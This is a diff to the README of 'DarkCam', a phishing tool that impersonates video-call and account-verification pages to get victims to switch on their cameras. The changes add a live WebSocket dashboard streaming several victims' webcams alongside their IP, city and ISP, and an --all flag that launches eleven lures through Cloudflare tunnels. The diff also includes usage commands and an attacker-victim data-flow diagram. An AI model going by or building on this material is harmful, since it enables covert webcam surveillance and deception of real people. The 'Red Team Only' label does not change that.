@@ -9,6 +9,7 @@
 [![Lure Pages](https://img.shields.io/badge/Lure%20Pages-11-darkred?style=flat-square)]()
 [![Flask](https://img.shields.io/badge/Flask-Backend-lightgrey?style=flat-square&logo=flask&logoColor=white)](https://flask.palletsprojects.com)
 [![Cloudflare](https://img.shields.io/badge/Cloudflared-Tunnel-orange?style=flat-square&logo=cloudflare&logoColor=white)](https://cloudflare.com)
+[![Live Dashboard](https://img.shields.io/badge/Live%20Dashboard-WebSocket-brightgreen?style=flat-square&logo=socket.io&logoColor=white)]()
 [![RedTeam](https://img.shields.io/badge/For-Red%20Team%20Only-cc0000?style=flat-square)]()
 
 </div>
@@ -42,6 +43,8 @@ DarkCam is a social engineering tool that creates convincing fake video call lur
   ✦  11 Realistic Lure Pages    →  Meet, Zoom, WhatsApp, Instagram,
                                     Omegle, Teams, Telegram, FaceTime,
                                     Instagram Verify, Google Verify, Paytm KYC
+  ✦  Live Streaming Dashboard   →  Real-time webcam feed at /live (WebSocket)
+  ✦  Multi-Victim Live View     →  All connected victims in one dashboard
   ✦  Live Video Capture         →  WebM format, 5s chunked upload
   ✦  IP + Geolocation Logging   →  City, Region, ISP, Country
   ✦  Auto Cloudflared Tunnel    →  Instant public HTTPS URL
@@ -49,6 +52,7 @@ DarkCam is a social engineering tool that creates convincing fake video call lur
   ✦  Auto Chunk Merge           →  Single .webm output per session
   ✦  Multi-Victim Support       →  Each victim gets unique session ID
   ✦  Real-time Terminal Logs    →  Live victim info on connect
+  ✦  --all Mode                 →  Launch all 11 lures simultaneously
 ```
 
 ---
@@ -135,36 +139,89 @@ python3 darkcam.py --page paytm_kyc
 # Custom port
 python3 darkcam.py --page telegram --port 9090
 
+# Launch ALL 11 lures simultaneously (11 tunnels in parallel)
+python3 darkcam.py --all
+
 # All flags
 python3 darkcam.py --page [meet|zoom|whatsapp|instagram|omegle|teams|telegram|facetime|instagram_verify|google_verify|paytm_kyc]
                    --port [PORT]
                    --no-tunnel
+                   --all
 ```
+
+---
+
+## Live Dashboard
+
+When a victim opens the lure link, their webcam stream is relayed **in real-time** to the attacker's dashboard.
+
+Open the live dashboard in your browser:
+
+```
+http://localhost:5000/live
+```
+
+Or through the Cloudflare tunnel:
+
+```
+https://your-tunnel.trycloudflare.com/live
+```
+
+**What you see:**
+
+```
+┌─────────────────────────────────────────────────┐
+│  ● DARKCAM LIVE          Active victims: 2 | Connected │
+├─────────────────────────────────────────────────┤
+│                                                 │
+│  ┌──────────────────────┐  ┌───────────────────┐│
+│  │ ● LIVE  INSTAGRAM VERIFY │  │ ● LIVE  GOOGLE VERIFY  ││
+│  │                      │  │                   ││
+│  │   [Live webcam feed] │  │  [Live webcam feed]││
+│  │                      │  │                   ││
+│  │ IP:   152.58.x.x     │  │ IP:   49.36.x.x   ││
+│  │ City: Mumbai, IN     │  │ City: Delhi, IN    ││
+│  │ ISP:  Reliance Jio   │  │ ISP:  Airtel       ││
+│  │ UA:   Chrome/Android │  │ UA:   Safari/iOS   ││
+│  └──────────────────────┘  └───────────────────┘│
+└─────────────────────────────────────────────────┘
+```
+
+- Video streams live via WebSocket (MediaSource Extensions)
+- Recording saves automatically to `output/SESSION.webm`
+- **SAVED** badge + download button appears when recording ends
+- Multiple victims visible simultaneously, each in their own card
 
 ---
 
 ## How It Works
 
 ```
- Attacker                        Victim
-    │                               │
-    │  python3 darkcam.py           │
-    │  ──────────────────────────►  │
-    │                               │
-    │  Flask server starts          │
-    │  Cloudflared tunnel → HTTPS   │
-    │  Public URL generated         │
-    │                               │
-    │  Send URL ──────────────────► │ Opens link
-    │                               │ Sees fake video call UI
-    │                               │ Clicks Accept/Join
-    │                               │ Browser asks camera permission
-    │  ◄────── /log (IP + geo) ──── │ Allows camera
-    │  ◄────── /upload (chunks) ─── │ Video recording starts
-    │  ◄────── /finalize ─────────  │ Session ends (45s)
-    │                               │
-    │  output/SESSION.webm saved    │
-    │  victims.log updated          │
+ Attacker                              Victim
+    │                                     │
+    │  python3 darkcam.py                 │
+    │  ──────────────────────────────►    │
+    │                                     │
+    │  Flask + SocketIO server starts     │
+    │  Cloudflared tunnel → HTTPS         │
+    │  Public URL generated               │
+    │                                     │
+    │  Open /live in browser              │
+    │  Dashboard connects via WebSocket   │
+    │                                     │
+    │  Send URL ────────────────────────► │ Opens link
+    │                                     │ Sees fake video call UI
+    │                                     │ Clicks Accept/Join
+    │                                     │ Browser asks camera permission
+    │  ◄──── /log (IP + geo) ──────────── │ Allows camera
+    │  ◄──── WebSocket victim_join ─────  │ Victim card appears on dashboard
+    │  ◄──── WebSocket live_chunk ──────  │ Live video streams to dashboard
+    │  ◄──── /upload (HTTP chunks) ─────  │ Chunks also saved to disk
+    │  ◄──── /finalize ─────────────────  │ Session ends (45s)
+    │                                     │
+    │  output/SESSION.webm saved          │
+    │  victims.log updated                │
+    │  SAVED badge on dashboard card      │
 ```
 
 ---
@@ -227,6 +284,8 @@ darkcam/
 
 - Python 3.8+
 - Flask
+- Flask-SocketIO
+- gevent + gevent-websocket
 - Colorama
 - Requests
 - Cloudflared binary
